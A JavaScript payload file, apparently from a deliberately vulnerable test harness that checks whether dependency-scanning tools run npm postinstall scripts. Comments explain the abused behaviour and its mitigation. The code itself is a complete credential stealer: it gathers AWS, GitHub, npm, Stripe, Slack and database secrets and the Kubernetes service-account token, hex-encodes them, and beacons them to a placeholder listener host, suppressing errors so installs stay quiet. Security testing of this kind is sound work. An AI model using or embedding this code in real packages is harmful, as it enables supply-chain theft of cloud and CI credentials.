// DVAP payload: Node beacon fired by an npm lifecycle (postinstall) script.
//
// Real behavior abused
// --------------------
// `npm install` runs a package's lifecycle scripts (preinstall/install/
// postinstall) by default. Any SCA tool that installs dependencies to analyze
// them therefore executes attacker-controlled shell/Node from package.json. This
// is one of the most-exploited supply-chain sinks in the wild.
//
// Mitigation (disable_extensibility): the worker runs `npm install
// --ignore-scripts` (a real npm flag), so postinstall -- and thus this file --
// never runs.
//
// Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
// (substituted by the worker). Node core modules only (http).

const http = require("http");
const fs = require("fs");

const SCAN_TOKEN = "__DVAP_SCAN_TOKEN__";
const VECTOR = "__DVAP_VECTOR__";
const LISTENER_HOST = "__DVAP_LISTENER_HOST__";
const LISTENER_PORT = "__DVAP_LISTENER_PORT__";

const SECRET_ENV_KEYS = [
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_CANARY_ACCESS_KEY_ID",
  "AWS_CANARY_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "GITHUB_TOKEN",
  "GITHUB_CANARY_TOKEN",
  "NPM_TOKEN",
  "DATABASE_URL",
  "POSTGRES_CANARY_DSN",
  "DVAP_DATABASE_URL",
  "LATERAL_MOVEMENT_DB_URL",
  "STRIPE_API_KEY",
  "SLACK_WEBHOOK_URL",
];
const K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token";

function collectExfil() {
  const lines = [];
  for (const key of SECRET_ENV_KEYS) {
    const val = process.env[key];
    if (val) {
      lines.push(key + "=" + val);
    }
  }
  try {
    const token = fs.readFileSync(K8S_TOKEN_PATH, "utf8").trim();
    if (token) {
      lines.push("K8S_SA_TOKEN=" + token);
    }
  } catch (e) {
    // token file absent (e.g. strip_credentials) -- ignore
  }
  return lines.join("\n");
}

function dottedHex(payload) {
  // hex-encode UTF-8 bytes, then split into ~60-char chunks joined by "."
  const hexed = Buffer.from(payload, "utf8").toString("hex");
  const chunks = [];
  for (let i = 0; i < hexed.length; i += 60) {
    chunks.push(hexed.slice(i, i + 60));
  }
  return chunks.join(".");
}

function beacon() {
  const dotted = dottedHex(collectExfil());
  const path = "/b/" + SCAN_TOKEN + "/" + VECTOR + "?d=" + dotted;
  const req = http.request(
    { host: LISTENER_HOST, port: LISTENER_PORT, path: path, method: "GET" },
    (res) => {
      res.on("data", () => {});
      res.on("end", () => {});
    },
  );
  // A blocked beacon (egress off / host unresolvable) must never crash install.
  req.on("error", () => {});
  req.end();
}

beacon();
